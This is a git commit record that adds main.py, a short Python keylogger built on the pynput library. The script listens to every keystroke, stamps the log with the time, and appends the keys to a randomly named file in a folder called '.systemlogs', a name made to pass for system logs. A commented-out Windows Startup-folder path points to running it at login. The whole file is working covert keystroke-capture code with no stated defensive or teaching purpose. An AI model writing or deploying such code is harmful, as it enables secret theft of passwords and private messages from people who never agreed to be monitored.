c2c4458f1ad79e1b20e82a467fbdb3f6c50afe33
gitmax681 <arjunmnath356@gmail.com>
2023-05-12 20:09:05 +0530

    initial commit #1

---
+++ main.py
@@ -0,0 +1,60 @@
+from pynput import keyboard
+import time
+import os
+import uuid
+import threading
+
+
+##C:\Users\Owner\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+ROOT = 'C:\\Users\\Owner\\.systemlogs\\'
+LOG = str(uuid.uuid4().hex)+'.txt'
+KEY = keyboard.Key
+STROKE = False
+BANNER = True
+if not os.path.exists(ROOT):
+    os.mkdir(ROOT)
+
+
+def on_press(key):
+    pass
+
+def on_release(key):
+    global BANNER,STROKE
+    STROKE = True
+    keystroke = str(key).strip("'")
+    f = open(os.path.join(ROOT,LOG), 'a+')
+    if BANNER == True:
+        f.write(f'\n [{time.ctime()}]' )
+        BANNER = False
+    if keystroke.isalnum():
+        f.write(keystroke)
+    elif key == KEY.space:
+        f.write(' ')
+    else:
+        f.write(f' [{key}] ')
+    if key == KEY.esc:
+        return False
+    f.close()
+
+
+def Logger():
+    with keyboard.Listener(
+            on_press=on_press,
+            on_release=on_release) as listener:
+        listener.join()
+
+def Timer():
+    global STROKE, BANNER
+    while True:
+        if STROKE == True:
+            STROKE = False
+            time.sleep(30)
+            BANNER = True
+
+
+thread1 = threading.Thread(target=Logger)
+thread2 = threading.Thread(target=Timer)
+thread1.start()
+thread2.start()
